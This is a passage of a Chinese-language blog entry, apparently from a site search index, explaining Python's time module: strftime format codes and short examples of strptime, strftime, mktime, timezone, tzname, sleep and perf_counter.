style="mso-spacerun:yes">&nbsp;&nbsp;</span></font></td> </tr> <tr height="41" style="mso-height-source:userset;height:31.05pt">  <td height="41" class="xl71" width="54" style="height:31.05pt;border-top:none;  width:41pt">%X</td>  <td class="xl70" width="442" style="border-top:none;border-left:none;width:331pt">时间的字符串表示<span style="mso-spacerun:yes">&nbsp; </span>' <font class="font7">02:20:20</font><font class="font8"> '<span style="mso-spacerun:yes">&nbsp;&nbsp;</span></font></td> </tr> <tr height="41" style="mso-height-source:userset;height:31.05pt">  <td height="41" class="xl71" width="54" style="height:31.05pt;border-top:none;  width:41pt">%z</td>  <td class="xl70" width="442" style="border-top:none;border-left:none;width:331pt">用  +HHMM<span style="mso-spacerun:yes">&nbsp; </span>或<span style="mso-spacerun:yes">&nbsp; </span>-HHMM<span style="mso-spacerun:yes">&nbsp; </span>表示距离格林威治（时间时）的时区偏移（ H 代表十进制的小时数，M  代表十进制的分钟数）</td> </tr> <tr height="41" style="mso-height-source:userset;height:31.05pt">  <td height="41" class="xl71" width="54" style="height:31.05pt;border-top:none;  width:41pt">%Z</td>  <td class="xl70" width="442" style="border-top:none;border-left:none;width:331pt">时区的名字（如果不存在，则返回空字符）</td> </tr> <!--[if supportMisalignedColumns]--> <tr height="0" style="display:none">  <td width="33" style="width:25pt"></td>  <td width="54" style="width:41pt"></td>  <td width="442" style="width:331pt"></td> </tr> <!--[endif]--></tbody></table><tbdiv id="picinpicBtn"></tbdiv><tbdiv id="playerControlBtn"></tbdiv><tbdiv id="leftFullStackButton"></tbdiv><tbdiv id="rightFullStackButton"></tbdiv></body><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">test1 = &#x27;2020/2/20 2:20:20&#x27;<br>format = &quot;%Y/%m/%d  %H:%M:%S&quot;<br>print (time.strptime(test1, format))<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  根据时间格式，从已经格式化的字符串中提取时间数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a = time.localtime(time.time())<br>time_format = &quot;%Y/%m/%d %H:%M:%S&quot;<br>b = time.strftime(time_format, a)<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  获取当前时间戳并转化为可读字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a = time.localtime()<br>b = int(time.mktime(a))<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  获取当前时间并转化为时间戳</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">time.timezone<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  当地时区（未启动夏令时）距离格林威治（时间时）的偏移秒数（美洲 &gt;0 ；大部分欧洲、亚洲、非洲 &lt;&#x3D;0）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">time.tzname<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  包含两个字符串的元组：</p><ul><li>第一个是当地非夏令时区的名称</li><li>第二个是当地的 DST（夏令时） 时区的名称</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">time.sleep(5)<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  程序暂停 5 秒后继续运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">time.perf_counter()<br></code></pre></td></tr></table></figure><p>&emsp;&#x2F;&#x2F;  cpu计时器也是用于计算代码的执行时间</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
